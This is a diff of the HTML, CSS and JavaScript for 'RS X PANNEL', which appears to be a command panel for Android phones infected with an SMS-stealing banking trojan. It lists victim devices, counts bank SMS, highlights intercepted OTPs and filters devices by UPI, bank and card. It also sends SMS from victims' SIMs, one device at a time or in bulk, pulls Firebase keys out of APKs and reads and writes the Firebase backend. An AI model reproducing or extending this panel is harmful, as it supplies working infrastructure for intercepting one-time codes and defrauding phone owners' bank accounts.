-            color: var(--text);
-            font-size: 14px;
-            word-break: break-word;
-            line-height: 1.5;
-        }
-        .sms-item .sms-otp {
-            display: inline-block;
-            background: rgba(0, 214, 143, 0.1);
-            color: var(--green);
-            font-weight: 700;
-            font-size: 15px;
-            padding: 2px 12px;
-            border-radius: 6px;
-            margin-top: 6px;
-        }
-
-        /* ─── SEND SMS SECTION ────────────────────────────────────────── */
-        .send-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin-top: 16px;
-        }
-        .send-grid .full {
-            grid-column: 1 / -1;
-        }
-        .send-grid label {
-            color: var(--dim);
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .send-grid input,
-        .send-grid textarea {
-            width: 100%;
-            padding: 10px 14px;
-            background: var(--bg3);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            color: var(--text);
-            font-size: 13px;
-        }
-        .send-grid input:focus,
-        .send-grid textarea:focus {
-            border-color: var(--cyan);
-        }
-        .send-grid textarea {
-            resize: vertical;
-            min-height: 80px;
-        }
-        .send-grid .sim-toggle {
-            display: flex;
-            gap: 10px;
-        }
-        .send-grid .sim-toggle button {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            background: var(--bg3);
-            color: var(--muted);
-            font-weight: 700;
-            font-size: 13px;
-            transition: 0.15s;
-        }
-        .send-grid .sim-toggle button.active {
-            border-color: var(--cyan);
-            color: var(--cyan);
-            background: rgba(24, 191, 255, 0.06);
-        }
-        .send-grid .sim-toggle button:hover {
-            border-color: var(--border2);
-        }
-        .send-btn {
-            width: 100%;
-            padding: 14px;
-            border: 0;
-            border-radius: 14px;
-            background: linear-gradient(90deg, #ff3027, #df3a08);
-            color: #fff;
-            font-weight: 700;
-            font-size: 15px;
-            box-shadow: 0 8px 25px rgba(255, 49, 30, 0.18);
-            transition: 0.15s;
-            margin-top: 4px;
-        }
-        .send-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(255, 49, 30, 0.3);
-        }
-        .send-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .send-result {
-            margin-top: 14px;
-            padding: 12px 16px;
-            border-radius: 12px;
-            font-size: 13px;
-            font-weight: 600;
-            display: none;
-        }
-        .send-result.ok {
-            display: block;
-            background: rgba(0, 214, 143, 0.08);
-            color: var(--green);
-            border: 1px solid rgba(0, 214, 143, 0.15);
-        }
-        .send-result.err {
-            display: block;
-            background: rgba(255, 77, 77, 0.08);
-            color: var(--red);
-            border: 1px solid rgba(255, 77, 77, 0.15);
-        }
-
-        /* ─── BULK MODAL ──────────────────────────────────────────────── */
-        .bulk-list {
-            max-height: 200px;
-            overflow-y: auto;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 8px 12px;
-            margin-bottom: 16px;
-            background: var(--bg3);
-        }
-        .bulk-list label {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 6px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-        }
-        .bulk-list label:last-child {
-            border-bottom: none;
-        }
-        .bulk-list input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
-            accent-color: var(--cyan);
-            cursor: pointer;
-        }
-
-        /* ─── RESPONSIVE ──────────────────────────────────────────────── */
-        @media (max-width: 900px) {
-            .grid {
-                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-            }
-        }
-        @media (max-width: 650px) {
-            .topbar {
-                padding: 0 14px;
-                gap: 10px;
-                flex-wrap: wrap;
-                height: auto;
-                padding: 12px 14px;
-            }
-            .topbar .logo {
-                font-size: 14px;
-                letter-spacing: 1px;
-            }
-            .topbar .search {
-                max-width: 100%;
-                order: 3;
-                flex-basis: 100%;
-            }
-            .topbar .actions .status {
-                display: none;
-            }
-            .grid {
-                grid-template-columns: 1fr;
-                padding: 10px 14px 20px;
-            }
-            .statsbar {
-                padding: 12px 14px;
-                gap: 16px;
-            }
-            .filters {
-                padding: 10px 14px;
-            }
-            .modal-box {
-                padding: 20px;
-            }
-            .brand h1 {
-                font-size: 30px;
-            }
-            .detail-grid {
-                grid-template-columns: 1fr;
-            }
-            .send-grid {
-                grid-template-columns: 1fr;
-            }
-            .send-grid .full {
-                grid-column: 1;
-            }
-            .toast {
-                white-space: normal;
-                max-width: 90%;
-                text-align: center;
-            }
-        }
-    </style>
+    /* ─── DETAIL ───────────────────────────────────────────────────── */
+    .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:24px}
+    .detail-item{padding:14px 16px;background:var(--bg3);border-radius:12px;border:1px solid var(--border)}
+    .detail-item .label{color:var(--dim);font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
+    .detail-item .value{color:var(--text);font-size:15px;font-weight:600;word-break:break-word}
+    .bank-sms-section{background:var(--bg3);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:16px}
+    .bank-sms-section .bank-header{font-size:13px;font-weight:700;color:var(--muted);margin-bottom:4px}
+    .bank-sms-section .bank-count{font-size:11px;color:var(--gold);margin-bottom:12px}
+    .bank-card{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:14px;margin-bottom:10px}
+    .bank-card .bank-top{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted);margin-bottom:6px}
+    .bank-card .bank-top .bank-name{font-weight:700;color:var(--gold)}
+    .bank-card .bank-top .bank-sender{color:var(--cyan)}
+    .bank-card .bank-top .bank-ac{color:var(--dim);font-family:monospace}
+    .bank-card .bank-balance{font-size:18px;font-weight:800;color:var(--green);margin:4px 0}
+    .bank-card .bank-balance .ref{font-size:12px;font-weight:400;color:var(--muted);margin-left:10px}
+    .bank-card .bank-txn{font-size:13px;color:var(--text);line-height:1.5;margin:4px 0}
+    .bank-card .bank-txn .dispute{color:var(--cyan);font-weight:600;cursor:pointer}
+    .bank-card .bank-txn .dispute:hover{text-decoration:underline}
+    .bank-card .bank-date{font-size:11px;color:var(--dim);margin-top:6px}
+    .sms-section h3{color:var(--muted);font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px;display:flex;gap:16px;align-items:center}
+    .sms-section h3 .count{color:var(--dim);font-weight:400;font-size:11px}
+    .sms-section .sms-search{margin-bottom:12px;display:flex;gap:8px}
+    .sms-section .sms-search input{flex:1;padding:8px 12px;border:1px solid var(--border);border-radius:10px;background:var(--bg3);color:var(--text);font-size:13px}
+    .sms-section .sms-search input:focus{border-color:var(--cyan)}
+    .sms-item{padding:12px 16px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;margin-bottom:8px}
+    .sms-item .sms-header{display:flex;justify-content:space-between;color:var(--dim);font-size:11px;margin-bottom:4px}
+    .sms-item .sms-body{color:var(--text);font-size:14px;word-break:break-word;line-height:1.5}
+    .sms-item .sms-otp{display:inline-block;background:rgba(0,214,143,0.1);color:var(--green);font-weight:700;font-size:15px;padding:2px 12px;border-radius:6px;margin-top:6px}
+    .send-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:16px}
+    .send-grid .full{grid-column:1/-1}
+    .send-grid label{color:var(--dim);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:4px}
+    .send-grid input,.send-grid textarea{width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:13px}
+    .send-grid input:focus,.send-grid textarea:focus{border-color:var(--cyan)}
+    .send-grid textarea{resize:vertical;min-height:80px}
+    .send-grid .sim-toggle{display:flex;gap:10px}
+    .send-grid .sim-toggle button{flex:1;padding:10px;border:1px solid var(--border);border-radius:12px;background:var(--bg3);color:var(--muted);font-weight:700;font-size:13px;transition:.15s}
+    .send-grid .sim-toggle button.active{border-color:var(--cyan);color:var(--cyan);background:rgba(24,191,255,0.06)}
+    .send-grid .sim-toggle button:hover{border-color:var(--border2)}
+    .send-btn{width:100%;padding:14px;border:0;border-radius:14px;background:linear-gradient(90deg,#ff3027,#df3a08);color:#fff;font-weight:700;font-size:15px;box-shadow:0 8px 25px rgba(255,49,30,0.18);transition:.15s;margin-top:4px}
+    .send-btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(255,49,30,0.3)}
+    .send-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+    .send-result{margin-top:14px;padding:12px 16px;border-radius:12px;font-size:13px;font-weight:600;display:none}
+    .send-result.ok{display:block;background:rgba(0,214,143,0.08);color:var(--green);border:1px solid rgba(0,214,143,0.15)}
+    .send-result.err{display:block;background:rgba(255,77,77,0.08);color:var(--red);border:1px solid rgba(255,77,77,0.15)}
+    .bulk-list{max-height:200px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:8px 12px;margin-bottom:16px;background:var(--bg3)}
+    .bulk-list label{display:flex;align-items:center;gap:10px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+    .bulk-list label:last-child{border-bottom:none}
+    .bulk-list input[type="checkbox"]{width:16px;height:16px;accent-color:var(--cyan);cursor:pointer}
+    @media(max-width:900px){.grid{grid-template-columns:repeat(auto-fill,minmax(240px,1fr))}}
+    @media(max-width:650px){.topbar{padding:0 14px;gap:10px;flex-wrap:wrap;height:auto;padding:12px 14px}
+    .topbar .logo{font-size:14px;letter-spacing:1px}
+    .topbar .search{max-width:100%;order:3;flex-basis:100%}
+    .topbar .actions .status{display:none}
+    .grid{grid-template-columns:1fr;padding:10px 14px 20px}
+    .statsbar{padding:12px 14px;gap:16px}
+    .filters{padding:10px 14px}
+    .modal-box{padding:20px}
+    .brand h1{font-size:30px}
+    .detail-grid{grid-template-columns:1fr}
+    .send-grid{grid-template-columns:1fr}
+    .send-grid .full{grid-column:1}
+    .toast{white-space:normal;max-width:90%;text-align:center}}
+  </style>
 </head>
 <body>
 
-    <!-- ─── TOAST ────────────────────────────────────────────────────────── -->
-    <div id="toast" class="toast"></div>
+  <div id="toast" class="toast"></div>
 
-    <!-- ─── HOME SCREEN ──────────────────────────────────────────────────── -->
-    <section id="homeScreen" class="screen">
-        <div class="shell">
-            <div class="brand">
-                <div class="logo">
-                    <svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
-                </div>
-                <h1>RS <span>X</span> PANNEL</h1>
-                <p>Device Management Console</p>
-            </div>
-            <div class="card">
-                <div class="card-header">
-                    <h3>◌ Saved Accounts</h3>
-                    <span class="badge" id="connCount">0</span>
-                </div>
-                <div id="connectionsList"></div>
-                <button class="btn-new" id="newConnBtn">＋ New Account</button>
-                <div id="homeError" class="error-text hidden"></div>
-            </div>
-            <div class="footer-text">RS X Admin Console · All connections are logged</div>
-        </div>
-    </section>
-
-    <!-- ─── NEW ACCOUNT MODAL ────────────────────────────────────────────── -->
-    <div class="modal-overlay" id="newAccountModal">
-        <div class="modal-box">
-            <div class="modal-header">
-                <h2>New Firebase Account</h2>
-                <button class="close" id="closeAccountModal">&times;</button>
-            </div>
-            <div class="form-group">
-                <label>Label</label>
-                <input id="accLabel" placeholder="e.g. My Project" value="RS Project" />
-            </div>
-            <div class="form-group">
-                <label>Firebase Database URL</label>
-                <input id="accUrl" placeholder="https://project.firebaseio.com" />
-            </div>
-            <div class="form-group">
-                <label>Authentication Key / Secret</label>
-                <input id="accKey" type="password" placeholder="AIza..." />
-            </div>
-            <div class="form-group">
-                <label>Extract from APK (optional)</label>
-                <div class="file-upload" id="apkUploadArea">
-                    <span>📁 Upload APK File</span>
-                    <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
-                    <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
-                </div>
-            </div>
-            <div id="setupError" class="error-text hidden"></div>
-            <div class="form-actions">
-                <button class="primary" id="saveAccountBtn">⚡ Save &amp; Connect</button>
-                <button class="secondary" id="cancelAccountBtn">Cancel</button>
-            </div>
-        </div>
+  <!-- HOME -->
+  <section id="homeScreen" class="screen">
+    <div class="shell">
+      <div class="brand">
+        <div class="logo"><svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg></div>
+        <h1>RS <span>X</span> PANNEL</h1>
+        <p>Device Management Console</p>
+      </div>
+      <div class="card">
+        <div class="card-header"><h3>◌ Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
+        <div id="connectionsList"></div>
+        <button class="btn-new" id="newConnBtn">＋ New Account</button>
+        <div id="homeError" class="error-text hidden"></div>
+      </div>
+      <div class="footer-text">RS X Admin Console · All connections are logged</div>
     </div>
+  </section>
 
-    <!-- ─── DASHBOARD ────────────────────────────────────────────────────── -->
-    <section id="dashboardScreen" class="dashboard">
-        <header class="topbar">
-            <div class="logo"><div class="dot">RS</div> RS X PANNEL</div>
-            <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
-            <div class="actions">
-                <span class="status" id="statusLabel">● Connected</span>
-                <a class="telegram" href="https://t.me/RSPANNEL" target="_blank">
-                    <svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
-                </a>
-                <button class="btn-icon" id="refreshBtn" title="Refresh">↻</button>
-                <button class="btn-icon" id="bulkBtn" title="Bulk SMS">📨</button>
-                <button class="logout" id="logoutBtn">Exit</button>
-            </div>
-        </header>
-
-        <div class="statsbar">
-            <div class="stat-item"><small>Total</small><strong id="totalStat">0</strong></div>
-            <div class="stat-item"><small>Online</small><strong class="green" id="onlineStat">0</strong></div>
-            <div class="stat-item"><small>Offline</small><strong class="red" id="offlineStat">0</strong></div>
-            <div class="stat-item"><small>Bank SMS</small><strong class="gold" id="bankStat">0</strong></div>
+  <!-- NEW ACCOUNT MODAL -->
+  <div class="modal-overlay" id="newAccountModal">
+    <div class="modal-box">
+      <div class="modal-header"><h2>New Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
+      <div class="form-group"><label>Label</label><input id="accLabel" placeholder="e.g. My Project" value="RS Project" /></div>
+      <div class="form-group"><label>Firebase Database URL</label><input id="accUrl" placeholder="https://project.firebaseio.com" /></div>
+      <div class="form-group"><label>Authentication Key / Secret</label><input id="accKey" type="password" placeholder="AIza..." /></div>
+      <div class="form-group">
+        <label>Extract from APK (optional)</label>
+        <div class="file-upload" id="apkUploadArea">
+          <span>📁 Upload APK File</span>
+          <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
+          <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
         </div>
-
-        <div class="filters">
-            <button class="filter active" data-filter="all">All</button>
-            <button class="filter" data-filter="online">Online</button>
-            <button class="filter" data-filter="offline">Offline</button>
-            <button class="filter" data-filter="favorite">Favorite</button>
-            <button class="filter" data-filter="upi">Upi</button>
-            <button class="filter" data-filter="bank">Bank</button>
-            <button class="filter" data-filter="card">Card</button>
-            <button class="sort" id="sortBtn">Sort: Newest</button>
-        </div>
-
-        <div class="grid" id="deviceGrid">
-            <div class="empty-grid">Loading devices…</div>
-        </div>
-    </section>
-
-    <!-- ─── DETAIL MODAL ──────────────────────────────────────────────────── -->
-    <div class="modal-overlay" id="detailModal">
-        <div class="modal-box" style="max-width:900px">
-            <div class="modal-header">
-                <h2 id="detailDeviceName">Device</h2>
-                <button class="close" id="closeDetailModal">&times;</button>
-            </div>
-            <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
-                <span id="detailStatus" style="font-weight:700">● Online</span>
-                <span>🔋 <span id="detailBattery">—</span>%</span>
-                <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
-                <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
-            </div>
-            <div class="detail-grid" id="detailGrid"></div>
-
-            <div class="sms-section">
-                <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
-                <div class="sms-search">
-                    <input id="smsSearch" placeholder="Search messages..." />
-                    <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
-                </div>
-                <div id="messageList"></div>
-            </div>
-
-            <hr style="border-color:var(--border);margin:20px 0" />
-
-            <div class="send-grid">
-                <div class="full">
-                    <label>Select SIM</label>
-                    <div class="sim-toggle">
-                        <button class="active" data-sim="1">SIM 1</button>
-                        <button data-sim="2">SIM 2</button>
-                    </div>
-                </div>
-                <div class="full">
-                    <label>Recipient</label>
-                    <input id="smsTo" placeholder="+919876543210" />
-                </div>
-                <div class="full">
-                    <label>Message</label>
-                    <textarea id="smsBody" placeholder="Type your message here..."></textarea>
-                </div>
-                <div class="full">
-                    <button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button>
-                    <div class="send-result" id="sendResult"></div>
-                </div>
-            </div>
-        </div>
+      </div>
+      <div id="setupError" class="error-text hidden"></div>
+      <div class="form-actions"><button class="primary" id="saveAccountBtn">⚡ Save &amp; Connect</button><button class="secondary" id="cancelAccountBtn">Cancel</button></div>
     </div>
+  </div>
 
-    <!-- ─── BULK MODAL ────────────────────────────────────────────────────── -->
-    <div class="modal-overlay" id="bulkModal">
-        <div class="modal-box" style="max-width:600px">
-            <div class="modal-header">
-                <h2>📨 Bulk SMS</h2>
-                <button class="close" id="closeBulkModal">&times;</button>
-            </div>
-            <p style="color:var(--muted);margin-bottom:12px">Select devices to send SMS</p>
-            <div class="bulk-list" id="bulkDeviceList"></div>
-            <div class="send-grid">
-                <div class="full">
-                    <label>Message</label>
-                    <textarea id="bulkMsg" placeholder="Message..." style="min-height:60px"></textarea>
-                </div>
-                <div class="full">
-                    <button class="send-btn" id="bulkSendBtn">📤 Send to Selected</button>
-                    <div class="send-result" id="bulkResult"></div>
-                </div>
-            </div>
-        </div>
+  <!-- DASHBOARD -->
+  <section id="dashboardScreen" class="dashboard">
+    <header class="topbar">
+      <div class="logo"><div class="dot">RS</div> RS X PANNEL</div>
+      <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
+      <div class="actions">
+        <span class="status" id="statusLabel">● Connected</span>
+        <a class="telegram" href="https://t.me/RSPANNEL" target="_blank"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
+        <span class="time" id="clockDisplay">--:--</span>
+        <button class="btn-icon" id="refreshBtn" title="Refresh">↻</button>
+        <button class="btn-icon" id="bulkBtn" title="Bulk SMS">📨</button>
+        <button class="logout" id="logoutBtn">Exit</button>
+      </div>
+    </header>
+    <div class="statsbar">
+      <div class="stat-item"><small>Total</small><strong id="totalStat">0</strong></div>
+      <div class="stat-item"><small>Online</small><strong class="green" id="onlineStat">0</strong></div>
+      <div class="stat-item"><small>Offline</small><strong class="red" id="offlineStat">0</strong></div>
+      <div class="stat-item"><small>Bank SMS</small><strong class="gold" id="bankStat">0</strong></div>
     </div>
+    <div class="filters">
+      <button class="filter active" data-filter="all">All</button>
+      <button class="filter" data-filter="online">Online</button>
+      <button class="filter" data-filter="offline">Offline</button>
+      <button class="filter" data-filter="favorite">Favorite</button>
+      <button class="filter" data-filter="upi">Upi</button>
+      <button class="filter" data-filter="bank">Bank</button>
+      <button class="filter" data-filter="card">Card</button>
+      <button class="sort" id="sortBtn">Sort: Newest</button>
+    </div>
+    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices…</div></div>
+  </section>
 
-    <script>
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  CORE LOGIC — RS X PANNEL (Firebase REST)
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  <!-- DETAIL MODAL -->
+  <div class="modal-overlay" id="detailModal">
+    <div class="modal-box" style="max-width:900px">
+      <div class="modal-header">
+        <h2 id="detailDeviceName">Device</h2>
+        <button class="close" id="closeDetailModal">&times;</button>
+      </div>
+      <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+        <span id="detailStatus" style="font-weight:700">● Online</span>
+        <span>🔋 <span id="detailBattery">—</span>%</span>
+        <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
+        <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
+      </div>
+      <div class="detail-grid" id="detailGrid"></div>
 
-        // ─── STATE ──────────────────────────────────────────────────────────
-        let CONNECTIONS = JSON.parse(localStorage.getItem('rsx_connections') || '[]');
-        let activeConn = null;
-        let allDevices = [];
-        let filterMode = 'all';
-        let searchQuery = '';
-        let selectedDevice = null;
-        let messageCache = {}; // deviceId -> messages[]
-        let simChoice = 1;
-        let pollTimer = null;
-        let sortMode = 'newest';
+      <!-- BANK SMS SECTION -->
+      <div id="bankSmsSection" class="bank-sms-section" style="display:none">
+        <div class="bank-header" id="bankHeader">Auto-detected from <span id="bankTotalSms">0</span> SMS</div>
+        <div class="bank-count" id="bankCountLabel">0 bank message(s) found</div>
+        <div id="bankSmsList"></div>
+      </div>
 
-        // ─── DOM REFS ──────────────────────────────────────────────────────
-        const $ = id => document.getElementById(id);
-        const homeScreen = $('homeScreen');
-        const dashboardScreen = $('dashboardScreen');
-        const connectionsList = $('connectionsList');
-        const connCount = $('connCount');
-        const homeError = $('homeError');
-        const setupError = $('setupError');
-        const deviceGrid = $('deviceGrid');
-        const searchInput = $('searchInput');
-        const statusLabel = $('statusLabel');
-        const totalStat = $('totalStat');
-        const onlineStat = $('onlineStat');
-        const offlineStat = $('offlineStat');
-        const bankStat = $('bankStat');
+      <!-- REGULAR SMS -->
+      <div class="sms-section">
+        <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
+        <div class="sms-search">
+          <input id="smsSearch" placeholder="Search messages..." />
+          <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
+        </div>
+        <div id="messageList"></div>
+      </div>
 
-        // Modals
-        const newAccountModal = $('newAccountModal');
-        const closeAccount = $('closeAccountModal');
-        const accLabel = $('accLabel');
-        const accUrl = $('accUrl');
-        const accKey = $('accKey');
-        const apkFileInput = $('apkFileInput');
-        const saveAccountBtn = $('saveAccountBtn');
-        const cancelAccountBtn = $('cancelAccountBtn');
+      <hr style="border-color:var(--border);margin:20px 0" />
+      <div class="send-grid">
+        <div class="full"><label>Select SIM</label><div class="sim-toggle"><button class="active" data-sim="1">SIM 1</button><button data-sim="2">SIM 2</button></div></div>
+        <div class="full"><label>Recipient</label><input id="smsTo" placeholder="+919876543210" /></div>
+        <div class="full"><label>Message</label><textarea id="smsBody" placeholder="Type your message here..."></textarea></div>
+        <div class="full"><button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
+      </div>
+    </div>
+  </div>
 
-        const detailModal = $('detailModal');
-        const closeDetail = $('closeDetailModal');
-        const detailGrid = $('detailGrid');
-        const messageList = $('messageList');
-        const smsTo = $('smsTo');
-        const smsBody = $('smsBody');
-        const sendSmsBtn = $('sendSmsBtn');
-        const sendResult = $('sendResult');
-        const smsSearch = $('smsSearch');
+  <!-- BULK -->
+  <div class="modal-overlay" id="bulkModal">
+    <div class="modal-box" style="max-width:600px">
+      <div class="modal-header"><h2>📨 Bulk SMS</h2><button class="close" id="closeBulkModal">&times;</button></div>
+      <p style="color:var(--muted);margin-bottom:12px">Select devices to send SMS</p>
+      <div class="bulk-list" id="bulkDeviceList"></div>
+      <div class="send-grid">
+        <div class="full"><label>Message</label><textarea id="bulkMsg" placeholder="Message..." style="min-height:60px"></textarea></div>
+        <div class="full"><button class="send-btn" id="bulkSendBtn">📤 Send to Selected</button><div class="send-result" id="bulkResult"></div></div>
+      </div>
+    </div>
+  </div>
 
-        const bulkModal = $('bulkModal');
-        const closeBulk = $('closeBulkModal');
-        const bulkDeviceList = $('bulkDeviceList');
-        const bulkMsg = $('bulkMsg');
-        const bulkSendBtn = $('bulkSendBtn');
-        const bulkResult = $('bulkResult');
+  <script>
+    // ─── STATE ──────────────────────────────────────────────────────────
+    let CONNECTIONS = JSON.parse(localStorage.getItem('rsx_connections') || '[]');
+    let activeConn = null;
+    let allDevices = [];
+    let filterMode = 'all';
+    let searchQuery = '';
+    let selectedDevice = null;
+    let messageCache = {};
+    let simChoice = 1;
+    let pollTimer = null;
+    let sortMode = 'newest';
 
-        // ─── TOAST ──────────────────────────────────────────────────────────
-        function toast(msg, type = 'success') {
-            const el = $('toast');
-            el.textContent = msg;
-            el.className = 'toast ' + type + ' show';
-            clearTimeout(el._hide);
-            el._hide = setTimeout(() => el.classList.remove('show'), 3000);
-        }
+    const $ = id => document.getElementById(id);
+    const homeScreen = $('homeScreen');
+    const dashboardScreen = $('dashboardScreen');
+    const connectionsList = $('connectionsList');
+    const connCount = $('connCount');
+    const deviceGrid = $('deviceGrid');
+    const searchInput = $('searchInput');
+    const totalStat = $('totalStat');
+    const onlineStat = $('onlineStat');
+    const offlineStat = $('offlineStat');
+    const bankStat = $('bankStat');
+    const clockDisplay = $('clockDisplay');
 
-        // ─── SCREEN NAVIGATION ────────────────────────────────────────────
-        function showHome() {
-            homeScreen.classList.remove('hidden');
-            dashboardScreen.style.display = 'none';
-            renderConnections();
-        }
+    const newAccountModal = $('newAccountModal');
+    const closeAccount = $('closeAccountModal');
+    const accLabel = $('accLabel');
+    const accUrl = $('accUrl');
+    const accKey = $('accKey');
+    const apkFileInput = $('apkFileInput');
+    const saveAccountBtn = $('saveAccountBtn');
+    const cancelAccountBtn = $('cancelAccountBtn');
 
-        function showDashboard() {
-            homeScreen.classList.add('hidden');
-            dashboardScreen.style.display = 'block';
-            refreshDevices();
-            startPolling();
-        }
+    const detailModal = $('detailModal');
+    const closeDetail = $('closeDetailModal');
+    const detailGrid = $('detailGrid');
+    const messageList = $('messageList');
+    const smsTo = $('smsTo');
+    const smsBody = $('smsBody');
+    const sendSmsBtn = $('sendSmsBtn');
+    const sendResult = $('sendResult');
+    const smsSearch = $('smsSearch');
 
-        // ─── CONNECTIONS ──────────────────────────────────────────────────
-        function renderConnections() {
-            if (!connectionsList) return;
-            if (CONNECTIONS.length === 0) {
-                connectionsList.innerHTML =
-                    `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
-                connCount.textContent = '0';
-                return;
-            }
-            connCount.textContent = CONNECTIONS.length;
-            connectionsList.innerHTML = CONNECTIONS.map((c, i) => `
-                    <div class="conn-item">
-                        <div class="info">
-                            <div class="name">${esc(c.label)}</div>
-                            <div class="date">${c.date || ''} · ${c.url ? c.url.substring(0, 30) + '…' : ''}</div>
-                        </div>
-                        <button class="connect" data-idx="${i}" title="Connect">▶</button>
-                        <button class="del" data-idx="${i}" title="Delete">✕</button>
-                    </div>
-                `).join('');
-            connectionsList.querySelectorAll('.connect').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const idx = parseInt(btn.dataset.idx);
-                    const conn = CONNECTIONS[idx];
-                    if (conn) {
-                        activeConn = conn;
-                        showDashboard();
-                        toast('Connected to ' + conn.label, 'success');
-                    }
-                });
-            });
-            connectionsList.querySelectorAll('.del').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const idx = parseInt(btn.dataset.idx);
-                    if (confirm('Delete "' + CONNECTIONS[idx].label + '"?')) {
-                        CONNECTIONS.splice(idx, 1);
-                        localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-                        renderConnections();
-                        toast('Deleted', 'error');
-                    }
-                });
-            });
-        }
+    const bankSmsSection = $('bankSmsSection');
+    const bankHeader = $('bankHeader');
+    const bankCountLabel = $('bankCountLabel');
+    const bankSmsList = $('bankSmsList');
 
-        // ─── FIREBASE HELPERS ─────────────────────────────────────────────
-        function fbUrl(path) {
-            return activeConn.url + '/' + path + '.json' + (activeConn.key ? '?auth=' + activeConn.key : '');
-        }
+    const bulkModal = $('bulkModal');
+    const closeBulk = $('closeBulkModal');
+    const bulkDeviceList = $('bulkDeviceList');
+    const bulkMsg = $('bulkMsg');
+    const bulkSendBtn = $('bulkSendBtn');
+    const bulkResult = $('bulkResult');
 
-        async function fbGet(path) {
-            const res = await fetch(fbUrl(path));
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            return res.json();
-        }
+    // ─── CLOCK ──────────────────────────────────────────────────────────
+    function updateClock() {
+      const now = new Date();
+      const h = String(now.getHours()).padStart(2,'0');
+      const m = String(now.getMinutes()).padStart(2,'0');
+      clockDisplay.textContent = h + ':' + m;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
 
-        async function fbSet(path, data) {
-            const res = await fetch(fbUrl(path), {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            return res.json();
-        }
+    // ─── TOAST ──────────────────────────────────────────────────────────
+    function toast(msg, type = 'success') {
+      const el = $('toast');
+      el.textContent = msg;
